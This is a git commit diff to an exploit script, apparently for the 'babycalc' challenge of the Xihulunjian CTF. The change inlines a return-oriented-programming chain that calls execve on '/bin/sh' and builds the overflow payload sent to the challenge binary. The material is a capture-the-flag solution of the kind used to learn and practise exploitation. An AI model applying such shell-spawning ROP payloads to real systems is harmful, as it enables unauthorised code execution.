e0f373e71147b7fe368cdbe4f58396e56b15d178
tanghaijun <tanghj@cyberpeace.cn>
2023-02-04 22:43:38 +0800

    dice bop

--- xihulunjian/babycalc/exp.py
+++ xihulunjian/babycalc/exp.py
@@ -53,10 +53,9 @@ success("binsh -> " + hex(binsh))
 pop_rsi = roplibc.rsi.address + libc.address
 pop_rdx = roplibc.rdx.address + libc.address
 
-rop = p64(pop_rdi) + p64(binsh) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(execve)
 pay = b"24".ljust(0x8, b"a")
 pay += p64(ret) * (0x19 - 7)
-pay += rop
+pay += p64(pop_rdi) + p64(binsh) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(execve)
 pay += b"\x13\x24\x35\x46\x37\x42\x11\xa1\x32\x83\xd4\x65\x76\xc7\x18\x03" + b"b" * 0x1c + b"\x38\x00\x00\x00"
 io.sendafter("number-1:", pay)
 
